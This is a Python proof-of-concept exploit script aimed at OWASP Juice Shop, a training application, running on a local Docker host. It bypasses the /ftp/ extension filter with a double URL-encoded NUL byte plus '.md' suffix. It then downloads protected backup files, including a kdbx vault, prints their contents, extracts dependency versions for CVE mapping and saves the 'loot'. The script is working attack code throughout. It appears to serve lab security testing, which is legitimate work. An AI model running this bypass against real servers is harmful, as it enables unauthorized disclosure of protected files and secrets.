#!/usr/bin/env python3
"""
PoC 4 - Improper file-download restriction bypass (path/extension filter bypass)
Target: OWASP Juice Shop 20.3.0  (http://host.docker.internal:3000)
Vuln:   The static file server for /ftp/ rejects anything that is not *.md/*.pdf
        by string-matching the URL suffix, but it passes the name through
        url.decode() before touching the filesystem. A double-encoded NUL
        ("%2500" -> "%00" -> "\0") truncates the filename at the OS level while
        the string still *ends* with ".md", so the extension check passes and
        the forbidden file is served.
            GET /ftp/package.json.bak              -> 403 Forbidden
            GET /ftp/package.json.bak%2500.md      -> 200 OK, real file contents
Impact: Disclosure of unlinked/backup files that the server explicitly tries to
        protect (package.json.bak, coupons_2013.md.bak, kdbx vault, .pyc, etc.)
        which leaks dependency versions, business rules and secrets.

Usage: python3 poc4_ftp_bypass.py
"""
import sys

import requests

BASE = "http://host.docker.internal:3000"
TARGETS = ["package.json.bak", "coupons_2013.md.bak", "incident-support.kdbx",
           "suspicious_errors.yml", "encrypt.pyc"]
BYPASS = "%2500.md"          # double URL-encoded NUL + allowed extension


def main() -> int:
    s = requests.Session()

    print("[*] 1. Direct request is blocked by the extension filter")
    r = s.get(f"{BASE}/ftp/package.json.bak")
    print(f"    GET /ftp/package.json.bak -> HTTP {r.status_code} {r.text[:60]!r}")

    print("\n[*] 2. Bypass with a double-encoded NUL byte + allowed extension")
    ok = 0
    for name in TARGETS:
        blocked = s.get(f"{BASE}/ftp/{name}")
        r = s.get(f"{BASE}/ftp/{name}{BYPASS}")
        size = len(r.content)
        status = "BYPASSED" if r.status_code == 200 and size > 0 else "blocked"
        if status == "BYPASSED":
            ok += 1
        print(f"    {name:<26} direct={blocked.status_code}  bypass={r.status_code} {size:>7}B  {status}")

    if not ok:
        print("[-] Bypass failed")
        return 1

    print("\n[*] 3. Contents of the file the server tried to hide")
    r = s.get(f"{BASE}/ftp/package.json.bak{BYPASS}")
    lines = r.text.splitlines()
    for ln in lines[:14]:
        print("    " + ln)

    # package.json.bak declares the app's real dependency versions
    print("\n[*] Extracting dependency versions from the leaked manifest "
          "(useful for CVE mapping):")
    import re
    for m in re.finditer(r'"(express|sequelize|jsonwebtoken|sanitize-html|ejs)":\s*"([^"]+)"', r.text):
        print(f"    {m.group(1):<14} {m.group(2)}")

    loot = "/workspace/loot/package.json.bak"
    with open(loot, "wb") as fh:
        fh.write(r.content)
    print(f"\n[+] VULNERABLE: {ok} forbidden files downloaded; loot saved to {loot}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
